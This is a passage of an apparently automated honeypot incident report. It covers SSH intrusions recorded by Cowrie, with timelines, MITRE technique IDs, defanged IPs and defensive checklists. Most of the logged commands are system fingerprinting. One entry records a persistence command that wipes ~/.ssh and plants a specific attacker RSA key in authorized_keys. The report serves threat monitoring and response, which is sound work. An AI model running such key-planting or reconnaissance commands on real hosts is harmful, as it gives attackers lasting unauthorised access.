| `2026-08-15 19:09:26` | `cowrie.command.input` |
| `2026-08-15 19:09:26` | `cowrie.command.input` |
| `2026-08-15 19:09:26` | `cowrie.command.input` |
| `2026-08-15 19:09:26` | `cowrie.command.input` |
| `2026-08-15 19:09:26` | `cowrie.command.input` |
| `2026-08-15 19:09:26` | `cowrie.command.success` |
| `2026-08-15 19:09:26` | `cowrie.command.input` |
| `2026-08-15 19:09:26` | `cowrie.command.input` |
| `2026-08-15 19:09:26` | `cowrie.command.input` |
| `2026-08-15 19:09:26` | `cowrie.command.input` |
| `2026-08-15 19:09:27` | `cowrie.log.closed` |
| `2026-08-15 19:09:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ee20025028e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:11 |
| **Last Seen** | 2026-08-15 19:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:11:02` | `cowrie.session.connect` |
| `2026-08-15 19:11:02` | `cowrie.client.version` |
| `2026-08-15 19:11:02` | `cowrie.client.kex` |
| `2026-08-15 19:11:04` | `cowrie.login.success` |
| `2026-08-15 19:11:05` | `cowrie.session.params` |
| `2026-08-15 19:11:05` | `cowrie.command.input` |
| `2026-08-15 19:11:05` | `cowrie.command.input` |
| `2026-08-15 19:11:05` | `cowrie.command.input` |
| `2026-08-15 19:11:05` | `cowrie.command.input` |
| `2026-08-15 19:11:05` | `cowrie.command.input` |
| `2026-08-15 19:11:05` | `cowrie.command.success` |
| `2026-08-15 19:11:05` | `cowrie.command.input` |
| `2026-08-15 19:11:05` | `cowrie.command.input` |
| `2026-08-15 19:11:05` | `cowrie.command.input` |
| `2026-08-15 19:11:05` | `cowrie.command.input` |
| `2026-08-15 19:11:06` | `cowrie.log.closed` |
| `2026-08-15 19:11:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8fdef55343d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:12 |
| **Last Seen** | 2026-08-15 19:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:12:44` | `cowrie.session.connect` |
| `2026-08-15 19:12:44` | `cowrie.client.version` |
| `2026-08-15 19:12:44` | `cowrie.client.kex` |
| `2026-08-15 19:12:45` | `cowrie.login.success` |
| `2026-08-15 19:12:46` | `cowrie.session.params` |
| `2026-08-15 19:12:46` | `cowrie.command.input` |
| `2026-08-15 19:12:46` | `cowrie.command.input` |
| `2026-08-15 19:12:46` | `cowrie.command.input` |
| `2026-08-15 19:12:46` | `cowrie.command.input` |
| `2026-08-15 19:12:46` | `cowrie.command.input` |
| `2026-08-15 19:12:46` | `cowrie.command.success` |
| `2026-08-15 19:12:46` | `cowrie.command.input` |
| `2026-08-15 19:12:46` | `cowrie.command.input` |
| `2026-08-15 19:12:46` | `cowrie.command.input` |
| `2026-08-15 19:12:46` | `cowrie.command.input` |
| `2026-08-15 19:12:47` | `cowrie.log.closed` |
| `2026-08-15 19:12:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-942534cdd575

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 19:13 |
| **Last Seen** | 2026-08-15 19:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:13:52` | `cowrie.session.connect` |
| `2026-08-15 19:13:52` | `cowrie.client.version` |
| `2026-08-15 19:13:52` | `cowrie.client.kex` |
| `2026-08-15 19:13:52` | `cowrie.login.success` |
| `2026-08-15 19:13:53` | `cowrie.session.params` |
| `2026-08-15 19:13:53` | `cowrie.command.input` |
| `2026-08-15 19:13:54` | `cowrie.log.closed` |
| `2026-08-15 19:13:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e93dbbaf8a1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:14 |
| **Last Seen** | 2026-08-15 19:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:14:26` | `cowrie.session.connect` |
| `2026-08-15 19:14:27` | `cowrie.client.version` |
| `2026-08-15 19:14:27` | `cowrie.client.kex` |
| `2026-08-15 19:14:28` | `cowrie.login.success` |
| `2026-08-15 19:14:29` | `cowrie.session.params` |
| `2026-08-15 19:14:29` | `cowrie.command.input` |
| `2026-08-15 19:14:29` | `cowrie.command.input` |
| `2026-08-15 19:14:29` | `cowrie.command.input` |
| `2026-08-15 19:14:29` | `cowrie.command.input` |
| `2026-08-15 19:14:29` | `cowrie.command.input` |
| `2026-08-15 19:14:29` | `cowrie.command.success` |
| `2026-08-15 19:14:29` | `cowrie.command.input` |
| `2026-08-15 19:14:29` | `cowrie.command.input` |
| `2026-08-15 19:14:29` | `cowrie.command.input` |
| `2026-08-15 19:14:29` | `cowrie.command.input` |
| `2026-08-15 19:14:30` | `cowrie.log.closed` |
| `2026-08-15 19:14:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a2376d6736e

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-15 19:15 |
| **Last Seen** | 2026-08-15 19:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:15:51` | `cowrie.session.connect` |
| `2026-08-15 19:15:51` | `cowrie.client.version` |
| `2026-08-15 19:15:53` | `cowrie.client.kex` |
| `2026-08-15 19:15:53` | `cowrie.login.success` |
| `2026-08-15 19:15:54` | `cowrie.session.params` |
| `2026-08-15 19:15:54` | `cowrie.command.input` |
| `2026-08-15 19:15:54` | `cowrie.log.closed` |
| `2026-08-15 19:15:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-130ef8b72166

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:16 |
| **Last Seen** | 2026-08-15 19:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:16:13` | `cowrie.session.connect` |
| `2026-08-15 19:16:14` | `cowrie.client.version` |
| `2026-08-15 19:16:14` | `cowrie.client.kex` |
| `2026-08-15 19:16:14` | `cowrie.login.success` |
| `2026-08-15 19:16:16` | `cowrie.session.params` |
| `2026-08-15 19:16:16` | `cowrie.command.input` |
| `2026-08-15 19:16:16` | `cowrie.command.input` |
| `2026-08-15 19:16:16` | `cowrie.command.input` |
| `2026-08-15 19:16:16` | `cowrie.command.input` |
| `2026-08-15 19:16:16` | `cowrie.command.input` |
| `2026-08-15 19:16:16` | `cowrie.command.success` |
| `2026-08-15 19:16:16` | `cowrie.command.input` |
| `2026-08-15 19:16:16` | `cowrie.command.input` |
| `2026-08-15 19:16:16` | `cowrie.command.input` |
| `2026-08-15 19:16:16` | `cowrie.command.input` |
| `2026-08-15 19:16:16` | `cowrie.log.closed` |
| `2026-08-15 19:16:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-576f6457f303

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 19:16 |
| **Last Seen** | 2026-08-15 19:17 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:16:38` | `cowrie.session.connect` |
| `2026-08-15 19:16:44` | `cowrie.client.version` |
| `2026-08-15 19:16:44` | `cowrie.client.kex` |
| `2026-08-15 19:17:06` | `cowrie.login.success` |
| `2026-08-15 19:17:18` | `cowrie.session.params` |
| `2026-08-15 19:17:18` | `cowrie.command.input` |
| `2026-08-15 19:17:23` | `cowrie.log.closed` |
| `2026-08-15 19:17:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1a339386a65

| Field | Detail |
|---|---|
| **Source IP** | `182.60.128[.]241` |
| **First Seen** | 2026-08-15 19:17 |
| **Last Seen** | 2026-08-15 19:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:17:27` | `cowrie.session.connect` |
| `2026-08-15 19:17:28` | `cowrie.client.version` |
| `2026-08-15 19:17:28` | `cowrie.client.kex` |
| `2026-08-15 19:17:30` | `cowrie.login.success` |
| `2026-08-15 19:17:30` | `cowrie.direct-tcpip.request` |
| `2026-08-15 19:17:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.60.128[.]241` to AbuseIPDB if not already reported
- [ ] Block `182.60.128[.]241` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80662406fd29

| Field | Detail |
|---|---|
| **Source IP** | `36.154.134[.]146` |
| **First Seen** | 2026-08-15 19:17 |
| **Last Seen** | 2026-08-15 19:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:17:36` | `cowrie.session.connect` |
| `2026-08-15 19:17:37` | `cowrie.client.version` |
| `2026-08-15 19:17:37` | `cowrie.client.kex` |
| `2026-08-15 19:17:39` | `cowrie.login.success` |
| `2026-08-15 19:17:40` | `cowrie.direct-tcpip.request` |
| `2026-08-15 19:17:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.154.134[.]146` to AbuseIPDB if not already reported
- [ ] Block `36.154.134[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a440b812c0a

| Field | Detail |
|---|---|
| **Source IP** | `15.235.192[.]186` |
| **First Seen** | 2026-08-15 19:17 |
| **Last Seen** | 2026-08-15 19:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:17:51` | `cowrie.session.connect` |
| `2026-08-15 19:17:51` | `cowrie.client.version` |
| `2026-08-15 19:17:51` | `cowrie.client.kex` |
| `2026-08-15 19:17:52` | `cowrie.login.success` |
| `2026-08-15 19:17:53` | `cowrie.session.params` |
| `2026-08-15 19:17:53` | `cowrie.command.input` |
| `2026-08-15 19:17:53` | `cowrie.command.failed` |
| `2026-08-15 19:17:54` | `cowrie.log.closed` |
| `2026-08-15 19:17:55` | `cowrie.session.params` |
| `2026-08-15 19:17:55` | `cowrie.command.input` |
| `2026-08-15 19:17:55` | `cowrie.session.file_download` |
| `2026-08-15 19:17:55` | `cowrie.log.closed` |
| `2026-08-15 19:17:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `15.235.192[.]186` to AbuseIPDB if not already reported
- [ ] Block `15.235.192[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbc5e948b25a

| Field | Detail |
|---|---|
| **Source IP** | `15.235.192[.]186` |
| **First Seen** | 2026-08-15 19:17 |
| **Last Seen** | 2026-08-15 19:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:17:55` | `cowrie.session.connect` |
| `2026-08-15 19:17:55` | `cowrie.client.version` |
| `2026-08-15 19:17:55` | `cowrie.client.kex` |
| `2026-08-15 19:17:56` | `cowrie.login.success` |
| `2026-08-15 19:17:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `15.235.192[.]186` to AbuseIPDB if not already reported
- [ ] Block `15.235.192[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23fefb770085

| Field | Detail |
|---|---|
| **Source IP** | `15.235.192[.]186` |
| **First Seen** | 2026-08-15 19:17 |
| **Last Seen** | 2026-08-15 19:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:17:57` | `cowrie.session.connect` |
| `2026-08-15 19:17:57` | `cowrie.client.version` |
| `2026-08-15 19:17:57` | `cowrie.client.kex` |
| `2026-08-15 19:17:58` | `cowrie.login.success` |
| `2026-08-15 19:17:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `15.235.192[.]186` to AbuseIPDB if not already reported
- [ ] Block `15.235.192[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fb186765350

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:18 |
| **Last Seen** | 2026-08-15 19:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:18:00` | `cowrie.session.connect` |
| `2026-08-15 19:18:00` | `cowrie.client.version` |
| `2026-08-15 19:18:00` | `cowrie.client.kex` |
| `2026-08-15 19:18:01` | `cowrie.login.success` |
| `2026-08-15 19:18:02` | `cowrie.session.params` |
| `2026-08-15 19:18:02` | `cowrie.command.input` |
| `2026-08-15 19:18:02` | `cowrie.command.input` |
| `2026-08-15 19:18:02` | `cowrie.command.input` |
| `2026-08-15 19:18:02` | `cowrie.command.input` |
| `2026-08-15 19:18:02` | `cowrie.command.input` |
| `2026-08-15 19:18:02` | `cowrie.command.success` |
| `2026-08-15 19:18:02` | `cowrie.command.input` |
| `2026-08-15 19:18:02` | `cowrie.command.input` |
| `2026-08-15 19:18:02` | `cowrie.command.input` |
| `2026-08-15 19:18:02` | `cowrie.command.input` |
| `2026-08-15 19:18:03` | `cowrie.log.closed` |
| `2026-08-15 19:18:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ae8af424182

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:19 |
| **Last Seen** | 2026-08-15 19:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:19:52` | `cowrie.session.connect` |
| `2026-08-15 19:19:52` | `cowrie.client.version` |
| `2026-08-15 19:19:52` | `cowrie.client.kex` |
| `2026-08-15 19:19:53` | `cowrie.login.success` |
| `2026-08-15 19:19:54` | `cowrie.session.params` |
| `2026-08-15 19:19:54` | `cowrie.command.input` |
| `2026-08-15 19:19:54` | `cowrie.command.input` |
| `2026-08-15 19:19:54` | `cowrie.command.input` |
| `2026-08-15 19:19:54` | `cowrie.command.input` |
| `2026-08-15 19:19:54` | `cowrie.command.input` |
| `2026-08-15 19:19:54` | `cowrie.command.success` |
| `2026-08-15 19:19:54` | `cowrie.command.input` |
| `2026-08-15 19:19:54` | `cowrie.command.input` |
| `2026-08-15 19:19:54` | `cowrie.command.input` |
| `2026-08-15 19:19:54` | `cowrie.command.input` |
| `2026-08-15 19:19:55` | `cowrie.log.closed` |
| `2026-08-15 19:19:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02f98d70549b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:21 |
| **Last Seen** | 2026-08-15 19:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:21:45` | `cowrie.session.connect` |
| `2026-08-15 19:21:45` | `cowrie.client.version` |
| `2026-08-15 19:21:45` | `cowrie.client.kex` |
| `2026-08-15 19:21:46` | `cowrie.login.success` |
| `2026-08-15 19:21:47` | `cowrie.session.params` |
| `2026-08-15 19:21:47` | `cowrie.command.input` |
| `2026-08-15 19:21:47` | `cowrie.command.input` |
| `2026-08-15 19:21:47` | `cowrie.command.input` |
| `2026-08-15 19:21:47` | `cowrie.command.input` |
| `2026-08-15 19:21:47` | `cowrie.command.input` |
| `2026-08-15 19:21:47` | `cowrie.command.success` |
| `2026-08-15 19:21:47` | `cowrie.command.input` |
| `2026-08-15 19:21:47` | `cowrie.command.input` |
| `2026-08-15 19:21:47` | `cowrie.command.input` |
| `2026-08-15 19:21:47` | `cowrie.command.input` |
| `2026-08-15 19:21:47` | `cowrie.log.closed` |
| `2026-08-15 19:21:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be99d3486641

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:23 |
| **Last Seen** | 2026-08-15 19:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:23:39` | `cowrie.session.connect` |
| `2026-08-15 19:23:39` | `cowrie.client.version` |
| `2026-08-15 19:23:39` | `cowrie.client.kex` |
| `2026-08-15 19:23:40` | `cowrie.login.success` |
